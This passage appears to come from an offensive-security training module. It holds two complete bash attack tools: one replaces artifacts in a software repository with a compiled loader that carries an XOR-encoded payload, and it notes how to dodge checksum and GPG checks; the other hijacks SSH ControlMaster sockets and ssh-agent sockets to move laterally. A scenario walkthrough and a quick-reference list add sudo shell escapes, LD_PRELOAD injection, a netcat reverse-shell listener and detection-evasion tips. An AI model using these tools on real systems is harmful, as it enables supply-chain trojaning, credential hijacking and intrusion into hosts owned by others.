  need curl
  [ -n "$URL_ARG" ] || die "pull needs <URL>"
  mkdir -p "$WORK"
  local out="${OUT:-$WORK/$(basename "$URL_ARG")}"
  info "download original: $URL_ARG"
  local code
  code="$(curl -sS $(curl_auth) -o "$out" -w '%{http_code}' "$URL_ARG")" || die "download failed (check URL / creds / egress): $URL_ARG"
  [ "$code" = "200" ] || die "download returned HTTP ${code} (expected 200): $URL_ARG"
  cp -p "$out" "$out.bak"
  sha_of "$out" > "$out.sha256"
  hit "saved: ${out} (backup ${out}.bak, original checksum ${out}.sha256)"
  do_info "$out"
  cat <<EOF

[*] Downstream checklist (know who/when/what is pulled before you decide the replace surface):
    1. How downstream pulls: crontab -l / systemctl list-timers / curl|wget lines in deploy scripts
    2. Filename and version suffix must match character-for-character (case and arch suffix included)
    3. Whether sha256/GPG is verified — if so, a hard replace will be noticed; switch to "replace a secondary dependency" or "repoint config"
    4. Business behavior: replacement must start cleanly and emit expected output; prefer "run original logic then load payload"
EOF
}

do_build() {
  need gcc
  [ -n "$FILE_ARG" ] || die "build needs <local original>"
  [ -f "$FILE_ARG" ] || die "original not found: $FILE_ARG"
  [ -f "$LOADER_SRC" ] || die "loader source not found: $LOADER_SRC"

  local base cls march extra
  base="$(basename "$FILE_ARG")"
  cls="$(elf_class "$FILE_ARG")"
  case "$ARCH" in
    auto) [ -n "$cls" ] || info "could not detect original arch; compiling for host default (use -a 32 if downstream is 32-bit)"; march="" ;;
    32)   march="-m32" ;;
    64)   march="-m64" ;;
    *)    die "-a accepts only auto|32|64" ;;
  esac
  if [ "$ARCH" = "auto" ] && [ -n "$cls" ]; then march="-m${cls}"; fi

  mkdir -p "$WORK"
  local src="$WORK/$base.c"
  local bin="${OUT:-$WORK/$base}"

  if [ -n "$PAYLOAD" ]; then
    need python3
    [ -f "$PAYLOAD" ] || die "payload file not found: $PAYLOAD"
    [ -f "$ENCODER_SRC" ] || die "encoder script not found: $ENCODER_SRC"
    python3 "$ENCODER_SRC" -i "$PAYLOAD" -k "$KEY" --c-array 2>/dev/null | grep -v '^\[' > "$WORK/array.c"
    [ -s "$WORK/array.c" ] || die "encode failed: check -p payload and -k key"
    awk -v arrfile="$WORK/array.c" '
      /EMBED_BEGIN/ {print; while ((getline line < arrfile) > 0) print line; skip=1; next}
      /EMBED_END/   {skip=0}
      skip==0       {print}
    ' "$LOADER_SRC" > "$src"
    extra="-DEMBED_PAYLOAD"
    hit "payload encoded and embedded (no plaintext payload on disk)"
  else
    cp "$LOADER_SRC" "$src"
    extra=""
    info "no -p: building external-file variant; place ${base}.enc next to it downstream (otherwise the replacement exits immediately)"
  fi

  local -a cargs=()
  [ -n "$march" ] && cargs+=("$march")
  [ -n "$extra" ] && cargs+=("$extra")
  cargs+=(-Wall -O2 -s -o "$bin" "$src")
  info "compile: gcc ${cargs[*]}"
  gcc "${cargs[@]}" || die "compile failed (32-bit target needs gcc multilib: apt install gcc-multilib)"

  local new_cls
  new_cls="$(elf_class "$bin")"
  if [ -n "$cls" ] && [ -n "$new_cls" ] && [ "$new_cls" != "$cls" ]; then
    die "arch mismatch: original elf${cls}, replacement elf${new_cls} (downstream will fail; use -a and confirm multilib)"
  fi
  hit "replacement: ${bin} (arch check OK: elf${new_cls:-unknown})"
  printf '  sha256: %s\n' "$(sha_of "$bin")"
  sha_of "$bin" > "$bin.sha256"
  cat <<EOF

[*] Next steps:
    1. Start listener: nc -lvnp LPORT
    2. Upload overwrite: $SELF push <URL> $bin --user USER --pass PASS
    3. Compare: $SELF verify <URL> $bin
    4. Wait for downstream scheduled pull; after verify remember: $SELF restore <URL> ${FILE_ARG}.bak
EOF
}

do_push() {
  need curl
  [ -n "$URL_ARG" ] && [ -n "$FILE_ARG" ] || die "push needs <URL> <local file>"
  [ -f "$FILE_ARG" ] || die "local file not found: $FILE_ARG"
  local -a cargs=(-sS -o /dev/null -w '%{http_code}')
  if [ -n "$AUSER" ]; then cargs+=(--user "$AUSER:$APASS"); fi
  cargs+=(-T "$FILE_ARG" "$URL_ARG")
  local code
  code="$(curl "${cargs[@]}")" || die "upload failed (check URL / creds / repo write rights): $URL_ARG"
  hit "upload returned HTTP ${code} (201/200 treated as success)"
  [ "$code" = "201" ] || [ "$code" = "200" ] || [ "$code" = "204" ] || die "upload not successful, HTTP $code"
  info "if the repo has CDN/cache, downstream may still get the old artifact — refresh cache or switch to a new version path if needed"
}

do_verify() {
  need curl
  [ -n "$URL_ARG" ] && [ -n "$FILE_ARG" ] || die "verify needs <URL> <local file>"
  [ -f "$FILE_ARG" ] || die "local file not found: $FILE_ARG"
  local tmp lsum rsum
  tmp="$(mktemp)"
  curl -sS $(curl_auth) -o "$tmp" "$URL_ARG" || die "re-download failed: $URL_ARG"
  lsum="$(sha_of "$FILE_ARG")"
  rsum="$(sha_of "$tmp")"
  rm -f "$tmp"
  printf '  local:  %s\n' "$lsum"
  printf '  remote: %s\n' "$rsum"
  if [ "$lsum" = "$rsum" ]; then
    hit "checksum match: remote is already our replacement"
  else
    die "checksum mismatch: likely cache / rights / path issue (try a version path, refresh cache, or confirm whether the repo rewrites metadata)"
  fi
}

do_restore() {
  need curl
  [ -n "$URL_ARG" ] && [ -n "$FILE_ARG" ] || die "restore needs <URL> <local backup (.bak)>"
  [ -f "$FILE_ARG" ] || die "backup not found: ${FILE_ARG} (pull auto-creates <file>.bak)"
  local -a cargs=(-sS -o /dev/null -w '%{http_code}')
  if [ -n "$AUSER" ]; then cargs+=(--user "$AUSER:$APASS"); fi
  cargs+=(-T "$FILE_ARG" "$URL_ARG")
  local code
  code="$(curl "${cargs[@]}")" || die "restore upload failed: $URL_ARG"
  hit "restore upload returned HTTP ${code}; compare once more against the original checksum recorded in ${FILE_ARG}.sha256"
}

# ---- argument parsing ----
[ $# -gt 0 ] || { usage; exit 2; }
CMD="$1"; shift
case "$CMD" in
  -h|--help) usage; exit 0 ;;
  info|pull|build|push|verify|restore) ;;
  *) usage; die "unknown command: $CMD" ;;
esac

while [ $# -gt 0 ]; do
  case "$1" in
    -h|--help)    usage; exit 0 ;;
    -p|--payload) [ $# -ge 2 ] || die "-p needs an argument: payload file"; PAYLOAD="$2"; shift 2 ;;
    -k|--key)     [ $# -ge 2 ] || die "-k needs an argument: XOR key"; KEY="$2"; shift 2 ;;
    -a|--arch)    [ $# -ge 2 ] || die "-a needs an argument: auto|32|64"; ARCH="$2"; shift 2 ;;
    -w|--work)    [ $# -ge 2 ] || die "-w needs an argument: work dir"; WORK="$2"; shift 2 ;;
    -o|--out)     [ $# -ge 2 ] || die "-o needs an argument: output file"; OUT="$2"; shift 2 ;;
    --user)       [ $# -ge 2 ] || die "--user needs an argument: account"; AUSER="$2"; shift 2 ;;
    --pass)       [ $# -ge 2 ] || die "--pass needs an argument: password/API key"; APASS="$2"; shift 2 ;;
    -*)           usage; die "unknown option: $1" ;;
    *)
      if [ -z "$URL_ARG" ]; then URL_ARG="$1";
      elif [ -z "$FILE_ARG" ]; then FILE_ARG="$1";
      else die "extra positional argument: $1"; fi
      shift ;;
  esac
done

case "$CMD" in
  info)    do_info "${URL_ARG}" ;;
  pull)    do_pull ;;
  build)   FILE_ARG="${FILE_ARG:-$URL_ARG}"; do_build ;;
  push)    do_push ;;
  verify)  do_verify ;;
  restore) do_restore ;;
esac
````

## Scenario 48 · No SSH password, but an already-authenticated reusable connection exists

### Situation
You already have a shell as some user on a Linux host (e.g. a web service user, or from an earlier scenario), but **do not know SSH passwords for other users/internal hosts**, and have no ready private key. The environment does have **already-authenticated SSH reuse**: (1) a `ControlMaster` multiplexing socket, and/or (2) a forwarded `ssh-agent`. Reusing them lets you “borrow” the existing auth context and log into other hosts **without password or private-key files**.

### Assumptions
- You run **as the user who owns the master connection/agent** (the scenario usually places you there; cross-user needs root).
- ControlMaster: the user’s `~/.ssh/config` has `ControlMaster auto` + `ControlPath` + `ControlPersist`, or an active master connection exists (socket file, e.g. `/home/USER/.ssh/controlmaster/USER@host:22`).
- Agent: the master used `ForwardAgent yes`, or a local `ssh-agent` already has keys loaded; the agent socket (`/tmp/ssh-XXXX/agent.NNNN`) is readable to you.
- Target hosts allow that user through these reuse channels (exactly the lateral surface this scenario demonstrates).

### Prepare (attacker)
1. Enumerate reusable assets:
   - ControlMaster sockets: `find ~/.ssh -name 'control*' -o -path '*controlmaster*' 2>/dev/null`, `ls -la ~/.ssh/`, `ps aux | grep 'ssh -M'`, `lsof -U 2>/dev/null | grep -i control` (same-user visible).
   - Agent: `ls /tmp/ssh-*/agent.* 2>/dev/null`, `echo $SSH_AUTH_SOCK`, `ssh-add -l`.
2. If config has no ControlMaster but you can write the user’s home and they have an active connection: inject `~/.ssh/config` so later connects reuse (`ControlMaster auto; ControlPath ~/.ssh/controlmaster/%r@%h:%p; ControlPersist 10m`) — see cheat sheet.
3. Prepare identity-check commands locally/on target (`id`, `hostname`).

### Procedure
1. **ControlMaster reuse**: find the socket (e.g. `/home/USER/.ssh/controlmaster/USER@TARGET:22`) and ride it — no password:
   - `ssh -S /home/USER/.ssh/controlmaster/USER@TARGET:22 USER@TARGET 'id && hostname'`
   - Or interactive `ssh -S <socket> USER@TARGET`.
   - Confirm socket naming (config `%h:%p` expansion); `ls` the real filename first.
2. **Agent-forward borrow**: if your session has a forwarded agent (`$SSH_AUTH_SOCK` points at a readable agent), `ssh-add -l` to see identities; then log into reachable hosts as that user:
   - `ssh -o StrictHostKeyChecking=no USER@TARGET 'id'` (agent signs; private key never lands).
3. **Other agent sockets** (same user’s other sessions/processes): point `SSH_AUTH_SOCK` at them and repeat:
   - `SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.NNNN ssh-add -l`
4. Continue enum/lateral on the landed target; **do not extract private-key files** (with an agent you do not need them; extraction is riskier and often fails — keys in the agent are frequently encrypted).

### Lab files
- `m13-ssh-controlmaster-hijack.sh`: auto-discover ControlMaster and usable agent sockets, try reuse logins, report successful targets and identities.

### Verify
- Reuse command returns target identity: `id`/`hostname` match the master-connection user with no password prompt.
- Agent borrow can log into hosts corresponding to identities listed by `ssh-add -l`.
- No password prompts and no `Permission denied (publickey)` errors.

### Failure branches / fallbacks
1. **Stale socket** (connection dead / ControlPersist expired): `ssh -S socket ...` reports `Control socket connect() failed` → do not force it; find an still-active master (`ps aux | grep 'ssh '` for interactive masters), or switch to the agent line.
2. **Agent identity cannot log into the target** (that user has no rights there, or target is outside the identity’s reach): walk `ssh-add -l` entries; try other usernames/hosts; if hostname is unknown, probe the reachable set first.
3. **ControlMaster socket name ≠ `%h:%p` expansion**: build `-S` from the real filename under `ls ~/.ssh/controlmaster/`.
4. **You are not the master-connection user (cross-user)**: without root you cannot read others’ sockets/agents (usually mode 0700) → this is not the scenario entry; find a same-user connection or escalate first.
5. **Target rejects reuse channels** (`ControlMaster` only one-way): fall back to agent forward; if both fail and you have no creds, this lateral path is not viable — record that clearly instead of slamming it.

### Exam OPSEC
- Reusing a connection is cleaner than stealing keys: **do not** `scp` out `id_rsa` or try to crack the agent with `ssh-keygen` (if you have an agent, just use it).
- Both `ssh -S` and agent borrow leave normal auth logs on the target (`Accepted publickey for ...` from reuse/agent); avoid high-volume scans that spam those logs.
- Do not kill someone else’s master/agent process (breaks other lab dependencies and exposes you).
- End with a normal `exit` and let the reuse socket expire via `ControlPersist`.

---

#### `m13-ssh-controlmaster-hijack.sh` {#m13-ssh-controlmaster-hijack-sh}

````bash
#!/usr/bin/env bash
# Purpose: Reuse an already-authenticated SSH context on the target to pivot to the next hop —
#       1) discover and reuse ControlMaster multiplexing sockets (ssh -S socket; no password, no
#          private-key file);
#       2) borrow a readable ssh-agent (SSH_AUTH_SOCK) and log into the next hop with its loaded
#          identities;
#       never touch, copy, or exfil any private-key file contents (with an agent, just use it —
#       extracting keys is dirtier and they are often encrypted).
# Scenario: 48 (no SSH password, but an already-authenticated reusable connection exists)
# Depends: openssh-client (ssh, ssh-add); run in a **controlled Linux user environment** (socket
#       owner is usually that user)
# Usage:
#   bash m13-ssh-controlmaster-hijack.sh                                   # discover sockets and agents; check each
#   bash m13-ssh-controlmaster-hijack.sh check  -s /home/USER/.ssh/controlmaster/USER@TARGET:22
#   bash m13-ssh-controlmaster-hijack.sh exec   -s <socket> -d USER@TARGET -c 'id; hostname'
#   bash m13-ssh-controlmaster-hijack.sh shell  -s <socket> -d USER@TARGET
#   bash m13-ssh-controlmaster-hijack.sh agent  -d USER@TARGET [-a /tmp/ssh-XXXX/agent.NNNN]
#   bash m13-ssh-controlmaster-hijack.sh forward -s <socket> -d USER@TARGET -L LPORT:TARGET:PORT
#   bash m13-ssh-controlmaster-hijack.sh prepare [--write]                 # generate/write ControlMaster config
#   bash m13-ssh-controlmaster-hijack.sh -h
# Placeholders: USER=target username; TARGET=next-hop host; LHOST/LPORT=callback address (when delivering
#       payload after landing on the next hop)
# Test status: bash -n syntax OK; not exercised in a live environment
set -uo pipefail

SELF="$(basename "$0")"
CMD=""
SOCK=""
DEST=""
REMOTE_CMD='id; hostname; uname -a'
AGENT="${SSH_AUTH_SOCK:-}"
FSPEC=""
DO_WRITE=0

usage() {
  cat <<EOF
Usage: $SELF <command> [options]

Commands:
  discover (default)                discover ControlMaster and agent sockets; ssh -O check each
  check    -s <socket>              check whether a ControlMaster socket is still valid
  exec     -s <socket> -d <USER@TARGET> [-c '<cmd>']   reuse authenticated connection to run a remote command
  shell    -s <socket> -d <USER@TARGET>                 reuse authenticated connection for an interactive shell
  agent    -d <USER@TARGET> [-a <agent socket>]         borrow ssh-agent identities to log into the next hop
  forward  -s <socket> -d <USER@TARGET> -L <LPORT:TARGET:PORT>   add local port forward on the reused connection
  prepare  [--write]             print (or backup+write ~/.ssh/config) ControlMaster config snippet

Options:
  -s, --socket <path>   ControlMaster socket path
  -d, --dest <USER@TARGET>   next-hop destination
  -c, --cmd '<command>' remote command to run (default: ${REMOTE_CMD})
  -a, --agent <path>     agent socket path (default: current SSH_AUTH_SOCK)
  -L, --forward <LPORT:TARGET:PORT>   local port-forward spec
      --write            with prepare, write the config into ~/.ssh/config (backup first)
  -h, --help            show this help

Examples:
  $SELF discover
  $SELF exec -s /home/USER/.ssh/controlmaster/USER@TARGET:22 -d USER@TARGET -c 'id'
  $SELF agent -d USER@TARGET -a /tmp/ssh-XXXX/agent.NNNN
EOF
}

die() { printf '[!] %s\n' "$*" >&2; exit 2; }
info() { printf '[*] %s\n' "$*"; }
hit() { printf '[+] %s\n' "$*"; }

need_ssh() { command -v ssh >/dev/null 2>&1 || die "ssh client missing"; }

# Read ControlPath from ~/.ssh/config (may include %h/%p/%r placeholders — expand/verify by hand)
show_config() {
  local cfg="${HOME:-/root}/.ssh/config"
  if [ -f "$cfg" ]; then
    info "reuse-related settings in ~/.ssh/config:"
    grep -nEi 'ControlMaster|ControlPath|ControlPersist|ForwardAgent' "$cfg" 2>/dev/null | sed 's/^/    /' || true
  else
    info "no ~/.ssh/config (${cfg})"
  fi
}

do_discover() {
  need_ssh
  info "enumerate ControlMaster sockets (visible to current user)"
  show_config
  local found=0 s
  while IFS= read -r s; do
    [ -n "$s" ] || continue
    case "$(basename "$s")" in
      agent.*) continue ;;   # agents handled separately
    esac
    found=1
    printf '\n[+] candidate socket: %s\n' "$s"
    ssh -O check -S "$s" 2>&1 | sed 's/^/    /'
    printf '    reuse exec: ssh -S %s <USER@TARGET> "id"\n' "$s"
  done < <(find "${HOME:-/root}/.ssh" /tmp -maxdepth 4 -type s 2>/dev/null \
             | grep -Ei 'control|master|cm_|cm-|sock' | sort -u)

  if [ "$found" -eq 0 ]; then
    printf '\n'
    info "no obviously named ControlMaster socket found; listing all sockets under /tmp and ~/.ssh for manual triage:"
    find "${HOME:-/root}/.ssh" /tmp -maxdepth 4 -type s 2>/dev/null | sed 's/^/    /'
  fi

  printf '\n'
  info "enumerate agent sockets (SSH_AUTH_SOCK=${SSH_AUTH_SOCK:-unset})"
  local a any=0
  for a in /tmp/ssh-*/agent.*; do
    [ -S "$a" ] || continue
    any=1
    printf '\n[+] agent: %s\n' "$a"
    SSH_AUTH_SOCK="$a" ssh-add -l 2>&1 | sed 's/^/    /'
    printf '    borrow: SSH_AUTH_SOCK=%s ssh <USER@TARGET> "id"\n' "$a"
  done
  if [ "$any" -eq 0 ]; then
    info "no /tmp/ssh-*/agent.* found; if this session has a forwarded agent, just run: ssh-add -l"
    ssh-add -l 2>&1 | sed 's/^/    /'
  fi

  cat <<'EOF'

[*] Two prerequisites for reuse (if unmet, this is not the scenario entry):
    1. You run as the master-connection owner (cross-user needs root; sockets are usually mode 0700)
    2. The target host allows that user/identity in (exactly the lateral surface this scenario shows)
[*] Do not kill someone else's master or agent process — it breaks other lab dependencies and exposes you
EOF
}

do_check() {
  need_ssh
  [ -n "$SOCK" ] || die "check needs -s <socket>"
  [ -S "$SOCK" ] || die "not a socket or missing: ${SOCK} (stale sockets report Control socket connect() failed)"
  info "check: $SOCK"
  ssh -O check -S "$SOCK" 2>&1 | sed 's/^/    /'
}

do_exec() {
  need_ssh
  [ -n "$SOCK" ] || die "exec needs -s <socket>"
  [ -S "$SOCK" ] || die "not a socket or missing: ${SOCK} (stale sockets report Control socket connect() failed)"
  [ -n "$DEST" ] || die "exec needs -d <USER@TARGET>"
  info "reuse $SOCK  ->  $DEST  run: $REMOTE_CMD"
  ssh -S "$SOCK" -o StrictHostKeyChecking=no "$DEST" "$REMOTE_CMD" 2>&1 | sed 's/^/    /'
}

do_shell() {
  need_ssh
  [ -n "$SOCK" ] || die "shell needs -s <socket>"
  [ -S "$SOCK" ] || die "not a socket or missing: ${SOCK}"
  [ -n "$DEST" ] || die "shell needs -d <USER@TARGET>"
  info "interactive shell (exit with exit; let ControlPersist expire naturally): ssh -S $SOCK $DEST"
  ssh -S "$SOCK" -o StrictHostKeyChecking=no -t "$DEST"
}

do_agent() {
  need_ssh
  [ -n "$DEST" ] || die "agent needs -d <USER@TARGET>"
  if [ -z "$AGENT" ]; then
    info "no -a given; using current SSH_AUTH_SOCK=${SSH_AUTH_SOCK:-unset}"
  fi
  info "identities available in the agent:"
  if [ -n "$AGENT" ]; then
    SSH_AUTH_SOCK="$AGENT" ssh-add -l 2>&1 | sed 's/^/    /'
  else
    ssh-add -l 2>&1 | sed 's/^/    /'
  fi
  info "log into ${DEST} with those identities (BatchMode = non-interactive; agent signs; private key never lands):"
  if [ -n "$AGENT" ]; then
    SSH_AUTH_SOCK="$AGENT" ssh -o BatchMode=yes -o StrictHostKeyChecking=no "$DEST" "$REMOTE_CMD" 2>&1 | sed 's/^/    /'
  else
    ssh -o BatchMode=yes -o StrictHostKeyChecking=no "$DEST" "$REMOTE_CMD" 2>&1 | sed 's/^/    /'
  fi
}

do_forward() {
  need_ssh
  [ -n "$SOCK" ] || die "forward needs -s <socket>"
  [ -S "$SOCK" ] || die "not a socket or missing: ${SOCK}"
  [ -n "$DEST" ] || die "forward needs -d <USER@TARGET>"
  [ -n "$FSPEC" ] || die "forward needs -L <LPORT:TARGET:PORT>"
  info "add local forward on reused connection: -L $FSPEC"
  ssh -S "$SOCK" -O forward -L "$FSPEC" "$DEST" 2>&1 | sed 's/^/    /'
  info "inspect forwards: ssh -S $SOCK -O forward -L $FSPEC $DEST ; ss -lntp 2>/dev/null | grep ${FSPEC%%:*}"
}

do_prepare() {
  local cfg="${HOME:-/root}/.ssh/config"
  local block='# --- m13: ControlMaster reuse (let later connects reuse an authenticated master) ---
Host *
    ControlMaster auto
    ControlPath ~/.ssh/controlmaster/%r@%h:%p
    ControlPersist 10m'
  if [ "$DO_WRITE" -eq 1 ]; then
    [ -d "${HOME:-/root}/.ssh" ] || die "no .ssh in home; cannot write"
    mkdir -p "${HOME:-/root}/.ssh/controlmaster"
    chmod 700 "${HOME:-/root}/.ssh/controlmaster"
    [ -f "$cfg" ] && cp -p "$cfg" "$cfg.m13.bak" && info "backed up original config: $cfg.m13.bak"
    printf '\n%s\n' "$block" >> "$cfg"
    hit "appended to ${cfg} (your own home only; backup taken first)"
  else
    info "suggested ~/.ssh/config snippet (add --write to actually write it):"
    printf '%s\n' "$block"
  fi
  info "after write: later ssh from the same user auto-reuses the master; sockets land under ~/.ssh/controlmaster/"
}

[ $# -gt 0 ] || { do_discover; exit 0; }
CMD="$1"; shift
case "$CMD" in
  -h|--help) usage; exit 0 ;;
  discover|check|exec|shell|agent|forward|prepare) ;;
  *) usage; die "unknown command: $CMD" ;;
esac

while [ $# -gt 0 ]; do
  case "$1" in
    -h|--help)    usage; exit 0 ;;
    -s|--socket)  [ $# -ge 2 ] || die "-s needs an argument: socket path"; SOCK="$2"; shift 2 ;;
    -d|--dest)    [ $# -ge 2 ] || die "-d needs an argument: USER@TARGET"; DEST="$2"; shift 2 ;;
    -c|--cmd)     [ $# -ge 2 ] || die "-c needs an argument: remote command"; REMOTE_CMD="$2"; shift 2 ;;
    -a|--agent)   [ $# -ge 2 ] || die "-a needs an argument: agent socket path"; AGENT="$2"; shift 2 ;;
    -L|--forward) [ $# -ge 2 ] || die "-L needs an argument: LPORT:TARGET:PORT"; FSPEC="$2"; shift 2 ;;
    --write)      DO_WRITE=1; shift ;;
    *)            usage; die "unknown option: $1" ;;
  esac
done

case "$CMD" in
  discover) do_discover ;;
  check)    do_check ;;
  exec)     do_exec ;;
  shell)    do_shell ;;
  agent)    do_agent ;;
  forward)  do_forward ;;
  prepare)  do_prepare ;;
esac
````

## Quick reference (this module’s command set)

```bash
# Encode / load
python3 m13-xor-encoder.py --key 0x41 -i stage2.bin -o stage2.enc       # file mode
python3 m13-xor-encoder.py --key 0x41 -i stage2.bin --c-array          # C-array mode (embed)
gcc -o loader m13-simple-loader.c                                     # business / in-memory modes via macros

# Shared libraries
gcc -Wall -fPIC -shared -o lib.so m13-shared-library-ldpreload.c -ldl
gcc -Wall -fPIC -shared -o libmissing.so.1.1 m13-shared-library-ldlibrarypath.c -ldl
LD_PRELOAD=/path/lib.so TARGET_BIN
LD_LIBRARY_PATH=/controlled/dir ldd TARGET_BIN

# sudo escape
sudo vim -c ':!/bin/sh'
sudo find . -exec /bin/sh \; -quit
sudo lua -e 'os.execute("/bin/sh")'

# SSH reuse
ssh -S /home/USER/.ssh/controlmaster/USER@TARGET:22 USER@TARGET 'id'
SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.NNNN ssh-add -l
```

## Script inventory ↔ scenarios

| Script | Scenario | Purpose |
|---|---|---|
| `m13-xor-encoder.py` | 36/37 | XOR encode/decode payload (file or C array) |
| `m13-simple-loader.c` | 36/37 | In-memory decode/exec of stage2; business-output / heartbeat mode |
| `m13-shared-library-ldpreload.c` | 38 | LD_PRELOAD inject `.so` |
| `m13-shared-library-ldlibrarypath.c` | 38 | Same-name replace for a missing library (LD_LIBRARY_PATH) |
| `m13-sudo-gtfobins.sh` | 39 | GTFOBins escape when sudo allows a single program |
| `m13-artifactory-replace.sh` | 40 | Artifact backup / replace / restore |
| `m13-ssh-controlmaster-hijack.sh` | 48 | Discover and borrow ControlMaster / agent reuse connections |
